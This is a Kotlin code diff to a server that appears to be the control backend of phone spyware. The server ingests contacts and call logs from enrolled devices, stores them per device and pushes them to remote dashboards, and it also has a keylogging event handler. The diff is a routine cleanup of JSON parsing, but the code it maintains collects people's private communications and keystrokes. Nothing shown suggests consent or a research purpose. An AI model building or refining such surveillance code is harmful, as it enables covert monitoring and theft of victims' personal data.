@@ -18,8 +18,10 @@ import kotlinx.serialization.encodeToString
 import kotlinx.serialization.json.Json
 import kotlinx.serialization.json.booleanOrNull
 import kotlinx.serialization.json.intOrNull
+import kotlinx.serialization.json.jsonArray
 import kotlinx.serialization.json.jsonObject
 import kotlinx.serialization.json.jsonPrimitive
+import kotlinx.serialization.json.longOrNull
 import java.io.File
 import java.security.MessageDigest
 import java.security.SecureRandom
@@ -1574,15 +1576,13 @@ fun main() {
                                                 }
                                             }
                                         } else if (type == "CONTACTS") {
-                                            val arr = json["contacts"]?.toString()?.let {
-                                                runCatching { Json.parseToJsonElement(it).jsonArray }.getOrNull()
-                                            }
+                                            val arr = runCatching { json["contacts"]?.jsonArray }.getOrNull()
                                             if (arr != null) {
                                                 val now = System.currentTimeMillis()
                                                 transaction {
                                                     ContactsTable.deleteWhere { ContactsTable.deviceId eq deviceId }
-                                                    arr.forEach { c ->
-                                                        val o = runCatching { c.jsonObject }.getOrNull() ?: return@forEach
+                                                    for (c in arr) {
+                                                        val o = runCatching { c.jsonObject }.getOrNull() ?: continue
                                                         ContactsTable.insert {
                                                             it[ContactsTable.deviceId] = deviceId
                                                             it[ContactsTable.name]     = o["name"]?.jsonPrimitive?.content ?: ""
@@ -1591,17 +1591,15 @@ fun main() {
                                                         }
                                                     }
                                                 }
-                                                broadcastToDashboards("""{"type":"CONTACTS","deviceId":"$deviceId","contacts":${arr}}""", deviceId)
+                                                broadcastToDashboards("""{"type":"CONTACTS","deviceId":"$deviceId","contacts":$arr}""", deviceId)
                                             }
                                         } else if (type == "CALL_LOG") {
-                                            val arr = json["calls"]?.toString()?.let {
-                                                runCatching { Json.parseToJsonElement(it).jsonArray }.getOrNull()
-                                            }
+                                            val arr = runCatching { json["calls"]?.jsonArray }.getOrNull()
                                             if (arr != null) {
                                                 transaction {
-                                                    arr.forEach { c ->
-                                                        val o = runCatching { c.jsonObject }.getOrNull() ?: return@forEach
-                                                        val ts  = o["timestamp"]?.jsonPrimitive?.content?.toLongOrNull() ?: System.currentTimeMillis()
+                                                    for (c in arr) {
+                                                        val o   = runCatching { c.jsonObject }.getOrNull() ?: continue
+                                                        val ts  = o["timestamp"]?.jsonPrimitive?.longOrNull ?: System.currentTimeMillis()
                                                         val num = o["number"]?.jsonPrimitive?.content ?: ""
                                                         val exists = CallLogsTable.select {
                                                             (CallLogsTable.deviceId eq deviceId) and
@@ -1613,12 +1611,12 @@ fun main() {
                                                             it[CallLogsTable.name]      = o["name"]?.jsonPrimitive?.content ?: ""
                                                             it[CallLogsTable.number]    = num
                                                             it[CallLogsTable.callType]  = o["type"]?.jsonPrimitive?.content ?: "incoming"
-                                                            it[CallLogsTable.duration]  = o["duration"]?.jsonPrimitive?.content?.toIntOrNull() ?: 0
+                                                            it[CallLogsTable.duration]  = o["duration"]?.jsonPrimitive?.intOrNull ?: 0
                                                             it[CallLogsTable.timestamp] = ts
                                                         }
                                                     }
                                                 }
-                                                broadcastToDashboards("""{"type":"CALL_LOG","deviceId":"$deviceId","calls":${arr}}""", deviceId)
+                                                broadcastToDashboards("""{"type":"CALL_LOG","deviceId":"$deviceId","calls":$arr}""", deviceId)
                                             }
                                         } else if (type == "KEYLOG_EVENT") {
                                             val keyText  = json["text"]?.jsonPrimitive?.content ?: ""
